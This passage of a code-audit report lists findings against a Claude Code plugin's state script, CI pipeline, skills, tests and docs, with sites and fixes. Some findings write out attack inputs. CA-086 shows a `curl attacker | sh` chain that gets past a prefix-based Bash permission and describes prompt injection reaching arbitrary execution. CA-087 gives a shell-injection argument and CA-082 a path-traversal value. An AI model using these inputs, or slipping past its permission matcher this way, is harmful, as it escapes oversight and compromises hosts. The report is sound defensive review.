| CA-051 | L1 | `bin/edm-state:2870` | The `--lenses` guard at `:2855` only requires non-empty, so `--lenses ,` passes, every line is blank, `grep -v '^$'` selects nothing, `pipefail` propagates and `set -e` terminates -- exit 1 with **no message**, in a command whose contract is `N=$(edm-state audit-round-start ...)`. The caller gets an empty round number | Normalise first, then `die` explicitly if the result is empty |
| CA-052 | L1 | `bin/edm-state:374-376` | `-v or="$out_rate"`: `or` is a gawk bit-manipulation built-in and gawk refuses to bind a built-in name as a variable -- a fatal error, so every `phase-complete` and `audit-round-complete` fails at the cost computation on any host where `awk` is gawk. bwk awk, mawk and busybox awk do not reserve it, which is why neither the dev machine nor CI surfaces it | Rename to `orr` -- one line, two occurrences |
| CA-054 | L2 | `bin/edm-state:1946-1949` | The `prototype)` case arm emits output byte-identical to the `*)` arm below it, since `${mode}` expands to `prototype` there | Delete the `case`, keep the single `${mode}` line |
| CA-055 | L3 | `bin/edm-state:3565-3583` | The comment claims tmp+`mv` "never interleaves with a concurrent update-patterns call". `mv` prevents a torn file, not a lost update, and no lock is taken on `$pattern_file`: two converging audits resolving `code-audit.md` both splice from their own stale `head`/`tail` reads, one insertion is lost, and both print "N new finding(s) appended" | Wrap the read-dedup-insert loop in `with_state_lock "${pattern_file%.md}"` |
| CA-056 | L3 | `bin/edm-state:3433-3448`, gate at `:3509` | Both the `grep -qxF` pre-flight and awk's `$0 == h` are fence-unaware and first-match-wins, so a pattern doc documenting its own Append Schema inside a fence gets the entry spliced into the fenced example, unbalancing the fence and tripping the four-heading contract check | Reuse the fence state machine or require the heading match to be outside any fence; refuse when the heading occurs more than once outside fences |
| CA-059 | L3 | `bin/edm-state:2883-2895`, `:2913-2923`, `:3133-3147`, `:1134-1202` | The round-number increment is atomic but the *echoed* value is re-read after the lock releases, so two concurrent starts can echo the same round and two rounds write into one `pass-N_<date>/`, one round's eleven reports overwriting the other's. The same pre-check-then-lock shape voids two documented once-only invariants (double round completion, close-once), and `cmd_init` takes no lock at all | Print the post-write value from inside the locked body; move each guard into the jq filter so check and write share the lock; take the lock in `cmd_init` |
| CA-060 | L3 | `bin/edm-state:265-296` | Both branches use `jq -s`, so one malformed line fails the whole program. The session JSONL is appended to live, so a torn final line makes the scoped branch fall through to the whole-directory fallback -- silently re-introducing the cross-window inflation T52 AC1 removed while tagging it `whole-directory`. If every file is torn the phase records 0 tokens, which `state_anomalies` then reports as a blocking `ZERO_TOKENS`. `EDM_TOKEN_READ_LINE_CAP` is also applied **per file** in the fallback, so 30 sessions read 30xN lines, not the bounded N the comment promises | Use tolerant per-line input so one torn line costs one message; add an `unparseable` attribution mode so the `unknown` arm does not absorb it; divide the cap by file count and warn when the window clips |
| CA-061 | L3 | `bin/edm-state:2522` via `record_degraded_check:1014-1020` | `cmd_gate_check` is documented read-only and is what five hooks call, but for a legacy initiative it appends an undeduplicated `degraded_checks` row and takes the write lock. Every prompt and every phase transition appends another identical row and `state_anomalies` emits one `ACTIVE_EXEMPTION` line per row, so session-start output grows linearly; it also blocks on the lock and fails on a read-only checkout | Make `record_degraded_check` idempotent on `(check, reason)`; drop the call from `gate-check` or amend its read-only contract |
| CA-062 | L3 | `bin/edm-state:2038-2046` via `git_aware_mv:443-450` | No `[[ ! -e "$dst" ]]` guard (`cmd_migrate_path:2412` has one). `git mv` refuses an existing destination and the `\|\| mv` fallback moves the source *inside* it, producing `SRD/.archived/PFX/PFX/` -- invisible to `list_state_files --archived` -- while printing success and exiting 0, so all metrics history for that prefix drops out | Add the destination guard; treat the `git mv` failure as fatal where the fallback changes semantics |
| CA-069 | L6 | `bin/edm-state:1947-1948`, `:2031`, `:1249` | Three wrong operator messages: the convergence waiver names `mode` as the cause when the second trigger leaves `mode` as `standard` (printing "standard mode -- skipping code-audit convergence check", which is false, one line above a line that gets it right); the archive refusal says "remediate the blocking findings" for all four exit-1 causes, two of which need ledger repair since re-running the audit cannot fix malformed JSONL; and `approve-gate`'s usage names one of three legal argument forms | Name the actual waiver trigger; make the archive guidance conditional or generic enough to cover ledger repair; `<gate-num>\|3.5\|code-audit` in the usage string |
| CA-082 | L8 | `bin/edm-state:193-206` | `state_file_for:169` rejects a `prefix` outside `^[A-Za-z0-9_-]+$` with the comment "prevent path traversal" and then interpolates two **unvalidated** env vars into the same path. `cmd_init` validates three other env vars but not the two that become directories, so `EDM_PRODUCT='../../../../tmp' edm-state init ABCD` writes outside the SRD root. Both flag entry points do validate, so this is defence-in-depth -- but it is the form that evades the `Bash(edm-state *)` permission matcher | Apply the same slug regex to `product` and `description` in `state_file_for` |
| CA-083 | L8 | `bin/edm-state:2049-2065` | `cmd_watch_impl` sets `last_sha` with `\|\| echo ''` then loops on `git log "${last_sha}..HEAD"` with `2>/dev/null \|\| true`. Armed with a cwd outside the worktree, or before the first commit, every poll errors and is swallowed -- the monitor runs the whole session emitting nothing and the operator cannot tell "no ticket commits yet" from "this will never fire" | Probe `--is-inside-work-tree` and a non-empty HEAD once before the loop and fail loudly |
| CA-093 | L10 | `bin/edm-state:1278-1283` | The mode half of the convergence exemption including the `mode == "null"` legacy default is written a **third** time outside `convergence_exempt`, and its comment says it "mirrors cmd_archive's identical guard" when `cmd_archive` no longer has that guard | Extract `audit_required_for_mode_or_legacy`; four lines added, three removed |

## Group P2-C: runtime hygiene and temp files

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-045 | L4 + L5 + L7 + L8 | `bin/tests/wave7-smoke.sh:167` and 18 further sites; `wave6-smoke.sh:818-819`, `:3237-3238`, `:3290-3291`, `:3413-3414`, `:3460-3461`; `_harness.sh:54`; `timing.sh` | Nineteen hardcoded `/tmp` scratch trees in `wave7-smoke.sh` with **no `trap` at any line in the file** and cleanup on the happy path only; several are megabytes (`cp -R` of `skills`, `agents`, `hooks`, `bin`). Nine `mktemp -d` fake-HOME trees in wave6 sit **outside** the trap-covered `$TMP`, and a leak leaves a directory shaped exactly like a real `~/.claude/projects/<encoded-cwd>/` containing synthetic token JSONL. `T43_SCRATCH` spans 200 lines with a bare `rm -rf` and no trap, and `neg_case_bogus_key` copies the whole live tree on every run where a `cp -R` failure kills the suite. Hardcoding `/tmp` rather than `${TMPDIR:-/tmp}` also puts concurrent agents and worktrees in one namespace -- the collision class that already produced a flake -- and `wave7:210,214`'s `>/tmp/edm-cg-bogus.$$.out` is symlink-followable on a shared build host. Wave6 documents the correct pattern for itself at `:394-396` and these nine did not follow it. Verified positive: `HOME` is overridden before and restored after every `stage_session_jsonl`, so no synthetic data reaches the real `~/.claude/` | One suite-level `TMP` plus `trap ... EXIT INT TERM` in `wave7-smoke.sh` and route all nineteen through it; create the nine wave6 trees inside `$TMP` and delete the five now-redundant inline `rm -rf` lines; replace every literal `/tmp` with `${TMPDIR:-/tmp}` in `_harness.sh` and `timing.sh`; `mktemp` the two bogus-key redirect paths. `edm-check-grants:114-115` is the reference implementation |
| CA-065 | L5 | `bin/edm-sync-canonical-sections:63-64`, `:91-92` | The staging `mktemp` is correctly trapped but the tracked destination is written with a non-atomic `cp` -- truncate-then-write -- so a signal or ENOSPC leaves half-written the one generated file that both `--check` and a smoke case byte-compare | `mktemp "${DST}.tmp.XXXXXX"`, trap, `mv -f`; add `plugins/edm/docs/*.tmp.*` to `.gitignore` |
| CA-066 | L5 | `evals/run-eval.sh:59`, `:193-194`; `.gitlab-ci.yml:174-179` | `evals/runs/` is gitignored but has **no retention policy at all** -- every invocation mints a directory with three full `claude -p` JSON payloads plus stderr logs and nothing prunes -- and it sits **inside the path the blocking 100KB `du` gate measures**, a budget documented as covering the fixture. So one local eval run makes the local reproduction of that gate fail with a message about a fixture budget. It survives in CI only because `GIT_CLEAN_FLAGS=-ffdx` wipes ignored files between pipelines: correct by accident of runner config | Scope the `du` to tracked bytes, which is what the documented budget means; keep the N most recent run directories and state the retention rule in `evals/README.md` |
| CA-067 | L5 | `bin/edm-lint-artifacts:343-355` | The attribution pattern file has no trap, and `scan_md_files` runs **inside** the per-initiative loop in `--all` mode, so the leak window is entered N times per run -- on the hot commit-hook path | Hoist to script scope, create once beside the PCRE probe, trap EXIT/INT/TERM |
| CA-084 | L8 | `bin/tests/timing.sh:34`, `:39`, `:287` | Undeclared hard `perl` dependency (`-MTime::HiRes`) whose header asserts perl "is present on every macOS and Linux CI image this plugin targets". `alpine:3.20` and `bash:3.2` ship no perl, and under `set -euo pipefail` the first `_now()` aborts -- so the harness cannot run where its own budget numbers are supposed to be produced. `--generate-fixture` is also the only mode with no cleanup and nothing tells the operator to delete the 50-initiative tree, and no mode carries a trap | Add perl to the requirements and to any job running `timing.sh`, or add an `awk`/`date` fallback guarded by `command -v perl`; print an explicit teardown line and add per-mode traps |

## Group P2-D: CI pipeline

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-046 | L7 + L8 + L10 | `.gitlab-ci.yml:42` vs `:353`; `:461` vs `:499` | Each pinned digest is spelled out twice, contradicting the `.alpine_edm` anchor comment's claim that a refresh "stays a single-line change across all seven jobs". A refresh following that comment leaves the **blocking** `validate:manifest` on a stale digest, failing with a manifest-unknown error that reads as infrastructure breakage. The node digest is duplicated with no anchor at all. `before_script: apk add --no-cache bash jq git` is also repeated verbatim in five jobs | Point `validate:manifest` at the anchor; add a `.node_edm` anchor; hoist the repeated `before_script` |
| CA-063 | L3 | `.gitlab-ci.yml:497-516` vs `evals/run-eval.sh:227` | `eval:nightly` declares no `timeout:` and inherits the 60-minute default while the driver allows 2700s per phase across three phases (135 minutes), so one slow phase replaces the documented exit-4 / `complete:false` contract with a GitLab timeout indistinguishable from a hung `claude` | Set `timeout:` above 3x phase plus provisioning, or set the phase budget in the job so the relation holds by construction |
| CA-071 | L6 | `.gitlab-ci.yml:10-11`, `:177` | The header states "every `image:` entry below is pinned to a `@sha256:` digest", which is false for `test:smoke-bash32` at `:277` -- and the exception is documented 260 lines later, so a reader auditing supply-chain posture from the header gets the wrong answer. The failure message at `:177` ends in a colon promising a list and then exits without printing one, while the parallel branch above it earns its colon | Amend the header to name the one exception; drop the colon or print the offenders |
| CA-075 | L7 | `.gitlab-ci.yml:351`, `:459` | Both validate jobs declare no `needs:` at all, so they wait for the whole lint **and** test stages, contradicting the stated split rationale. Neither depends on any lint or test job | `needs: []` or a narrow list on both |
| CA-076 | L7 | `.gitlab-ci.yml:102-103`, `:114-115`, `:64-78`, `:134-147`, `:234` | `lint:grants` and `lint:vocabulary` install `git`, which neither checker invokes and neither comment justifies, in a file whose convention is to justify each package. Two lint jobs print no terminal job-named verdict, so a green log ends on the last per-file `OK:` while the other two print one. `:234` hardcodes "all five library docs" inside a dynamic loop with two exemptions | Drop `git` from both; add the verdict line to the two; print the counted number |
| CA-085 | L8 | `.gitlab-ci.yml:63`, `:85`, `:103`, `:115`, `:132`, `:160`, `:194`, `:250`, `:281`, `:307`, `:356` | Every blocking job's `before_script` is an unpinned network package install, and the guard that claims to forbid network calls in blocking jobs cannot see it: it greps only `curl `, `wget ` and `anthropic\.com`, does not look at `before_script`, and its job-body extractor resets on `^[a-zA-Z_.-]+:$`, which **cannot match a job name containing a colon** (`lint:bash-syntax:`), so the flag is never cleared and the "body" runs to end of file. The assertion passes for the wrong reason | Broaden the pattern to `apk add\|apt-get\|npm install`; include `before_script`; fix the reset pattern; add a positive control by injecting a `curl` into a scratch copy |

## Group P2-E: prompt-surface and skill wiring

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-048 | L7 + L11 | `skills/code-audit/SKILL.md:8` vs `:317-319`; `skills/audit-srd/SKILL.md:8`; `skills/audit-tickets/SKILL.md:8` | All three curation blocks prescribe a literal shell `grep` under the heading "Derive the list ... by grep, never from state", and **none grants `Bash(grep *)`**. A denied grep is indistinguishable from zero matches, and all three say "Absence is authoritative", so the failure mode is silent loss of curation at every gate. `implement/SKILL.md` grants `Bash(grep *)` and contains no grep | Rewrite as a `Grep`-tool instruction (all three grant `Grep`); drop the unused grant from `implement`. Fix with CA-021 |
| CA-077 | L7 | `skills/code-audit/SKILL.md:107-111` vs `audit-srd:42-47`, `audit-tickets:44-49` | `update-patterns` runs at sub-step 10.5, **after** Approve, where both siblings run it before their gate. The Convergence gate is the last gate before archive, so a converging round leaves its own stubs `pending-review` with no later gate to curate them -- structurally always. No technical blocker: the ledger it needs is written before the gate | Move it to a pre-gate step, or state the reason |
| CA-078 | L7 | `skills/audit-tickets/SKILL.md:144-148`, `skills/code-audit/SKILL.md:93-111` vs `plan:77-81`, `audit-srd:148-153` | Gate 3 and the Convergence gate append nothing to `decisions.md` while Gates 1 and 2 do, with nothing stating the omission is intentional, so a reader treating `decisions.md` as the initiative-wide ledger gets two of four gates | Append at both, or state why they are the exception |
| CA-097 | L11 | `skills/orchestrator/SKILL.md:66-68` vs `skills/push-jira/SKILL.md:30`, `:219` | The Jira intake calls bare `getAccessibleAtlassianResources` / `getJiraIssue` -- unnamespaced and unprobed -- while `push-jira` uses `mcp__{jira_mcp_namespace}__...` and probes availability first, and `.mcp.json` declares no Atlassian server. One of three documented intake shapes is unreachable on any install where the jira plugin is absent or differently namespaced | Namespace both calls and probe first, as `push-jira` does |
| CA-098 | L11 | `skills/code-audit/SKILL.md:183` vs `:37-43` | Step 3 resolves `INIT_DIR` layout-aware, but the lens launch template hands lenses a legacy-flat `${user_config.srd_root}/{PREFIX}/...`, which does not exist for a product-scoped initiative -- the canonical layout, and this initiative's own. L9, which the skill marks as *requiring* the SRD and ticket pack, is the lens this silently starves | Interpolate the resolved `INIT_DIR` into the launch template |
| CA-080 | L7 | `agents/edm-audit-dead-code.md:50`, `:55`; `agents/edm-audit-logic.md:51`, `:56`, `:72-76` | Two lenses carry a False-Alarm-Filter lead-in and trailer the other nine dropped, **in two non-matching phrasings**; and `edm-audit-logic` renders the canonical-severity clause as a bulleted field inside a four-item list where ten render a bare sentence. Eleven copies with one differently-shaped is how the next edit lands in ten of eleven. Verified uniform otherwise: tools, model, effort, maxTurns, color, disallowedTools, the mandate sentence, the two-write-path output contract, the ASCII clause, the JSONL schema and all five enum bullets | Drop the two outliers, or add one identical pair to all eleven; normalise the severity clause shape. Cross-references CA-018 |
| CA-081 | L7 | `agents/edm-test-e2e.md:22`, `:139`; `agents/edm-test-a11y.md:20`, `:136`, `:138-139` | The test-writer N/A exit tokens are neither uniform nor substring-distinguishable: e2e carries a bare `"N/A"` where five siblings carry a reason suffix, and a bare `"N/A"` is a substring of all five; a11y's bottom-of-file string is not its own Step-0 token while `:138-139` claims it is, and `"N/A -- no UI"` is a strict prefix of component's `"N/A -- no UI components"` | Add a reason suffix to e2e; widen and de-collide a11y's token |
| CA-087 | L8 | `hooks/hooks.json:19`, `:32`, `:45`, `:58`, `:71` | The five `UserPromptExpansion` hooks apply no charset filter to `$ARGUMENTS` while the `PreToolUse` hook filters its derived prefixes. The downstream sink is defended (`state_file_for` dies outside the charset), so the residual exposure is whether the host substitutes the argument text into the command string before executing it; in the substitution case `/edm:srd FOO"; id > /tmp/pwn; echo "` is injection at expansion time. Reported at moderate confidence -- the host's semantics could not be settled from the repository. The same line also blocks expansion with a bare `exit 1` and no message when `$ARGUMENTS` is empty | Add the same one-line charset filter, correct regardless of which semantics apply; print a message on the empty case |
| CA-095 | L10 | `agents/edm-audit-dry.md:71` plus ten siblings; `bin/edm-check-grants:12-13`, `:382-384` | One shared line in all eleven lens definitions cites `SKILL.md:40` for the `mkdir -p`, which is on line 45 -- one fact, eleven places, drifted in all eleven simultaneously. Two more stale citations sit in `edm-check-grants` | Drop the line numbers; cite the section name |

## Group P2-F: `bin/` family conventions

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-049 | L7 + L10 | `bin/edm-check-vocabulary:57`, `bin/edm-sync-canonical-sections:32` vs `bin/edm-check-grants:94`; `wave7:12`, `wave6:702`, `wave4b:6`, `timing.sh:26` vs `_harness.sh:39-40` | Plugin root resolved from `$0` rather than `BASH_SOURCE` in two `bin/` scripts, which computes the wrong root when sourced -- and `wave7-smoke.sh:27` **does** source `edm-state` in a subshell. Three variable names for one value in `bin/`, four divergent `PLUGIN_DIR` derivations and two `REPO_ROOT` derivations across the suites, with `wave4b:6` the only copy using `$0` | Settle on `PLUGIN_DIR` from `${BASH_SOURCE[0]}` in `bin/`; export `_HARNESS_PLUGIN_DIR` / `_HARNESS_REPO_ROOT` and add `harness_scratch_srd_root()`; roughly 10 lines added, 35 removed |
| CA-074 | L7 | `bin/edm-lint-artifacts:51` vs `bin/edm-check-vocabulary:64`, `bin/edm-check-grants:61`; `bin/edm-validate-prefix:4-7`; `bin/edm-check-skill-sync:24`, `bin/edm-compare-eval:31` | Three convention divergences in the nine-script family: `die()` still defaults to exit **1** where siblings default to 2, so any future `die` added without the literal exits 1, indistinguishable from "violations found" -- the exact confusion the split exists to prevent; `edm-validate-prefix` **inverts** the family contract (1 = invalid format and usage error, 2 = collision) and `edm-init:59-64` forwards it verbatim; and two scripts run `set -uo pipefail` without `-e`, of which only `edm-compare-eval` has a reason (it captures comparison exit statuses) and it carries no comment | `edm-lint-artifacts:51` -> `${2:-2}`; move `edm-sync-canonical-sections`'s usage errors to 2; fix or document `edm-validate-prefix`'s inversion in the `bin/` table -- silence is the finding; `edm-check-skill-sync` -> `-euo`, `edm-compare-eval` keeps `-uo` with a comment |
| CA-096 | L10 | `bin/tests/run-all.sh:98-113` vs `:115-130` | The same 15-line standalone-checker invocation block appears twice, differing only in script name, variable prefix and label. Borderline at two copies, but an 8-line `_standalone_check` removes roughly 30 lines and makes a third checker a one-liner | Extract `_standalone_check` |
| CA-079 | L7 | `bin/tests/run-all.sh:2`, `:50` | Non-ASCII in six test files including `run-all.sh:50`, which the blocking `test:smoke` job **prints to stdout** on every pipeline -- so the aggregator violates on stdout the ASCII rule its own suite asserts for `edm-state`'s help, every lens agent's output contract and every committed artifact. `_harness.sh` mixes both conventions within one file. (The comment-only instances are NOTED as CA-113; this is the actionable residue) | Fix `run-all.sh:2` and `:50` first, then `_harness.sh` and the four older suites |
| CA-094 | L10 | `bin/tests/wave7-smoke.sh:1003`, `:1809`, `:1947`, `:2227`, `:2336`, `:2443`, `:2534` vs `:3014` | Seven further identical whole-tree `--all` scans beyond the five already collapsed, and **13 identical `edm-check-grants` invocations in one suite** (plus a 14th in `run-all.sh`), two of them in the same T46 section, with nothing mutating the tree between them. T67 rewrote two hot loops to meet a 3000 ms budget and this suite then spends 13 whole-tree grant scans and 7 whole-tree lints on one invariant. The per-ticket ritual also produces false attribution -- an `--all` failure reported under "T36" has nothing to do with T36 | Hoist the capture above the first consumer; add a grants capture; keep the timed run and the one case that asserts on output. Roughly 18 process trees removed per run |

## Group P2-G: test quality residue

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-099 | L4 | `bin/tests/wave4b-smoke.sh:167` plus 16 sites | Needles too short to fail: `mode` matches `model` and `modes`; `P0`, `AskUserQuestion`, `tdd`, `TDD`, `escalate`, `qc/`, `set-mode`, and nine CLAUDE.md "in layout" checks that only prove a filename appears somewhere in a 1000-line file. The labels claim behaviours the words do not establish | Scope each to its section with `_wave7_extract_section`; where the label claims a behaviour, assert the sentence |
| CA-100 | L4 | `bin/tests/wave7-smoke.sh:3318`, `:986-990`, `:3334` | The four-way lint split is asserted by job *name* only -- nothing asserts the jobs exist, are in the lint stage, collectively still invoke every checker, or carry no `allow_failure`. `allow_failure: true` is counted globally (expects 2), so moving it onto a lint job while removing it elsewhere keeps the count and passes. `:3334` records the split as an unfixed gap while `:3318` treats it as landed -- the suite contradicts itself | Iterate the four names; assert existence, stage, no `allow_failure`, and that the union of scripts names all four checkers; scope the `allow_failure` count to named blocks. Add the CA-004 `--lenses` assertion here |
| CA-102 | L4 | `bin/tests/wave7-smoke.sh:313-314`, `:358`, `:954-957`, `:963-968`, `:1861-1867`, `:2461`, `:2477`, `:3362`; `wave6:2756`, `:3520` | Assertions coupled to transient state or exact wording: hard-coded absolute line ranges into files other tickets edit freely, so an insertion above silently changes what is asserted; baseline counts that will drift and whose failure message reads as a test defect rather than a drift signal; and an alternation count `>= 4` satisfied by `schema_version` appearing four times with the other three fields absent | Use `_wave7_extract_section` or an awk range keyed on the heading; name the source of truth in each failure message and prefer documented-versus-disk as `wave7:310-312` already does; split the alternation into four scoped assertions |
| CA-103 | L4 | `bin/tests/wave7-smoke.sh:3009-3014` | The shared-lint invariant -- "nothing between here and T48 may mutate the tree or change `EDM_SRD_ROOT`/cwd" -- is enforced by a comment only, and five ticket blocks depend on it | Re-hash cwd plus `EDM_SRD_ROOT` plus a `git status --porcelain` fingerprint before the T48 block and assert it matches |
| CA-104 | L4 | `evals/tiering-matrix.sh:207-231`, `:254-259` | The `--self-test` covers 90, 100 and 70 percent, so changing `>= 80` to `> 80` passes all three unchanged -- this is the single mechanical rule that will retier 15 opus/max agents and its only numeric boundary has no test. `recall_pct` is also a bare count ratio while the docstring emphasises specific-finding comparison, with nothing pinning the distinction. And `run_matrix "$MANIFEST"; exit 0` produces no output and exit 0 on an empty agents array or a jq error, claiming a table for no table | Add agents at exactly 80 percent (QUALIFY) and 79 percent (DISQUALIFIED), plus one matching count with different P2 IDs asserted to qualify with a comment saying that is deliberate; assert at least one `DECISION` line before exiting 0 and add a real-path case |

## Group P2-H: documentation accuracy

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-053 | L2 | `evals/run-eval.sh:215-220` vs `:288-290` | A comment describes `--bare` as what makes AC8 true at the CLI level; the NOTE 70 lines later says the opposite and explains why it was removed; and `--bare` appears nowhere in the `claude -p` invocation at `:279-287`. Two comments in one function disagreeing about a flag's presence is the drift this initiative exists to remove | Delete `:215-220`, fold anything surviving into the `:288-290` NOTE |
| CA-068 | L6 | `CHANGELOG.md:203`; `:325-358` duplicated at `:387-420` | The AC8 row still presents `git diff --stat shows zero changes` as the proof of PASS while the same file at `:75-76` declares exactly that evidence invalid and records its replacement. Separately, four `Added` bullets appear **twice, byte-identically**, inside one version entry, separated by an unnecessary `### Added (continued)` split -- the two-copies-drift shape this initiative exists to close, in its own changelog | Name the seven scoping assertions as the AC8 evidence and drop the `git diff --stat` claim; delete the second copy and fold the continuation into the single `### Added` |
| CA-070 | L6 | `CLAUDE.md:411`; the model/effort paragraph; the `schema_version` contract vs `bin/edm-state:1168` | Three stale contracts: `tokens.cache_write` is documented but nothing writes it (the code writes `cache_write_5m`/`cache_write_1h`, `:466` of the same file explains the TTL split, and a jq query for the documented name returns null); the model-and-effort paragraph omits `verify-runtime` (sonnet/high), the mandatory Phase 6 closure step, and the three `test*` skills, so it covers 10 of 14; and the `schema_version` contract says `cmd_init` writes "the wave the running plugin version belongs to" when it writes the literal `1`, so a brand-new 3.1.0 initiative warn-and-proceeds through every wave-B check by name | List the two real token fields; add `verify-runtime` and the test skills or state that the testing layer has its own section; document the real `schema_version` behaviour and why (`migrate-schema` is the only writer of 2) -- if the intent was otherwise, that is a code change for a correctness lens |
| CA-072 | L6 | `bin/edm-lint-artifacts:145-149`, `:338-341` | Two comments each claim sole authorship of the same 39,872 ms measurement, which the CHANGELOG attributes to both per-line fork loops and records re-profiled at 70,168 ms. "This loop was the cause" is the sharper error | Say "one of the two per-line fork loops" in both and cross-reference |
| CA-073 | L6 | `bin/tests/timing.sh:301`, `:254-258` | `--all-lint` prints an initiative count it never measured, using the default 50, in a harness whose header states "no numbers are invented" -- run against a 10-initiative fixture it asserts 50, and the CHANGELOG quotes this mode as the AC7 evidence. The `--mermaid-ratio` comment says the ratio "should stay near 1.0x" because files with no fence short-circuit, but the mode appends a fence to **every** file, so the cited mechanism is inactive for the number being produced | Derive the count from the fixture at measurement time; state the fixture honestly -- one diagram per file, the worst realistic case, short-circuit deliberately not exercised |
| CA-086 | L8 | `evals/run-eval.sh:225` vs `:204-212` | The tool allow-list grants `Bash(jq *)` while the comment above claims "nothing ... grants unrestricted shell access" and "the run cannot reach anything outside the scratch tree via a tool call". This repository's own README documents the Bash matcher as a **literal prefix match** and `edm-state:629-635` restates the bypass shapes, so `jq -n '""' ; curl attacker \| sh` satisfies the prefix. With `--permission-mode acceptEdits` and no human to answer a prompt, a prompt-injected phase prompt reaches arbitrary execution outside the scratch tree | There is no safe prefix here: correct the comment to state the residual capability honestly and rely on the isolation the job already has. **The false claim is the more dangerous half, because it is what a reviewer will trust** |

## Group P2-I: eval scoring robustness

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-064 | L3 | `evals/score-artifacts.sh:464-471` | An unparseable or zero-byte `run.json` defaults to `complete: true`, and `write_partial_artifacts` truncates before writing so a `jq` failure there leaves zero bytes. `edm-compare-eval` then compares a partial run against the baseline -- exactly what the handshake exists to prevent | Default the unparseable case to `false`, or emit `complete: null` and refuse anything not literally `true` |
| CA-088 | L8 | `evals/score-artifacts.sh:382`, `:392` | A filename-derived token is interpolated unescaped into a `grep -E` pattern, so a run directory containing a file literally named `lens-L*.jsonl` yields `lens_n="*"` and the ERE matches the wrong rows -- dimension 5 scores against the wrong count and the baseline comparison is silently skewed | `case "$lens_n" in ''\|*[!0-9]*) continue ;; esac` |

## Group P2-J: spec and ticket-pack hygiene

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-089 | L9 | `bin/edm-check-skill-sync:42-60`; `epics/05:101`, `:603-605`, `:628`; `srd.md:2754` | T39 explicitly forbade building this script ("written **only** on the fallback path. **Do not build it speculatively.**"); the dispatcher shipped, the comparison never ran (D23), the fallback was not adopted, and the script exists anyway with its own header arguing for it -- with **no amendment to T39 AC7, T39's Technical Notes or `srd.md:2754`**. Second and separate: it does **not** do what the spec says. EDMV3-52 / T39 AC7 specify "a script asserting the duplicated orchestration blocks **are identical**"; the shipped script asserts the inverse -- that `## Operational Orchestration` appears in *no* phase-skill copy inside the dispatcher and in *every* phase skill. That is a re-purposed anti-duplication guard, not the specified sync checker | Amend `srd.md` EDMV3-52 and T39 AC7 to describe the guard that actually shipped and why the not-taken branch was still built and wired, or delete the script and its `run-all.sh` call. Do not leave the SRD describing a script the tree does not contain |
| CA-090 | L9 | `epics/02-enforcement-kernel.md:185-193` vs `bin/edm-state:1322-1325` | T06 AC10 names the code-audit gate's three sibling scalars as `code_audit_converged_at`, `_approver`, `_enforcement`; the code writes `code_audit_gate_approved_at`, `code_audit_gate_approver`, `code_audit_gate_enforcement` (plus `code_audit_gate_ledger`). The AC's verify command only checks that `code_audit_converged` stays type boolean, so the naming divergence is invisible to the test that is supposed to close it. `bin/edm-state` and `CLAUDE.md` are internally consistent; only the ticket disagrees | Amend T06 AC10 to the three `code_audit_gate_*` names (the shipped names parallel `compliance_gate_*` and are the better ones) and add a `jq -e 'has(...)'` assertion so the names are actually checked |
| CA-091 | L9 | `epics/03-ci-and-fixture-eval.md:566-569` | T23 AC13 states "the baseline is captured **before the first wave-B commit**. This ticket is a wave-A exit criterion." Wave B shipped at 3.0.0 and wave C at 3.1.0, so **no closing command can ever satisfy this AC** -- its precondition is permanently gone. D23 records the missing baseline at length with a valid closing command and the wave-A CHANGELOG entry records it in one clause, but neither addresses AC13's temporal clause, and D23 is framed entirely around T39 and never names T23. Under D15 this is a specification defect requiring rework; D13 forbids leaving it. (The baseline's absence itself is the recorded boundary CA-106; this finding is the unreworked AC text) | Rework AC13 into something verifiable today -- for example "the baseline is captured and committed, and `git log -1 --format=%cI plugins/edm/evals/baseline/scores.json` is recorded in `CHANGELOG.md` alongside the SHA the run was taken against" -- and extend D23 to name T23 AC8/AC9/AC13 explicitly |
| CA-092 | L9 | `tickets/README.md:3` vs `:10` vs `:576` | The header says `Generated From: srd.md v1.3.0` and agrees with the SRD, but `:10` records `v1.2.0 (120 requirements)` and `:576` opens the SRD Coverage Map with "Every requirement in `../srd.md` **v1.2.0** appears exactly once below". A reader reconciling coverage against v1.3.0 is reading a map that declares itself derived from the previous revision | Bump `:10` and `:576` to v1.3.0, or add one sentence stating the v1.3.0 delta introduced no requirement changes so the v1.2.0-derived map remains exact. Leave `:759`/`:772` at v1.2.0 -- they are correctly historical |

---

# Decisions / Non-Findings

Twenty-eight items were flagged or examined and determined Not Actionable. Future audits should
**not** re-investigate them. Each carries its ledger ID and a one-line rationale.

## Recorded scope boundaries in `decisions.md` (a lens raised it; the decision already argues it)

1. **CA-105** `bin/edm-state:314-373` -- no pricing arm matches any live model, so every run warns
   and is priced at placeholder Sonnet rates. **D32** records this in full, leaves the $25.869 figure
   as recorded per T52 AC9 rather than repricing against invented rates, and assigns verified
   Sonnet 5 / Fable 5 / Opus 5 rows to EDMV4. Raised by L2 (unreachable arms and silent
   mispricing), L4 (untested half) and L6 (stale prose). The **documentation** half is open as
   CA-012 and the **test** half as CA-041 -- those are not covered by D32 and are separate findings.
2. **CA-106** `evals/baseline/README.md:3` -- the wave-A eval baseline does not exist. **D23** records
   seven capture attempts, six fixed driver defects and one org spend limit, with an executable
   closing command, and `edm-compare-eval`'s distinct exit 3 guarantees an absent baseline cannot
   read as a pass. The unreachable exit-3 *handler* is CA-007; the unreworked AC text is CA-091.
3. **CA-107** `bin/edm-state:2253-2272` -- the tiered-versus-untiered cost section has no producer.
   The in-code comment states this and **D28** records the matrix as built, unit-verified and
   deliberately not run pending D23's baseline.
4. **CA-108** `decisions.md:34` -- T67 AC6's Mermaid-ratio budget is a bare ratio with no input size
   and no absolute ceiling. **D26** calls the budget shape malformed from both directions and **D29**
   carries the re-derivation as named ticket **EDMV4-T01**.
5. **CA-109** `decisions.md:35` -- T67 AC9 and AC13 are recorded `verified-locally-pending-pipeline`
   rather than PASS. **D27** names the missing dependency in each case.
6. **CA-110** `decisions.md:39` -- the banned-file-type scan uses `git ls-files` where T57 AC5
   specified `find`. **D30** accepts the deviation, amends the AC, and records both forms measured
   returning 0.
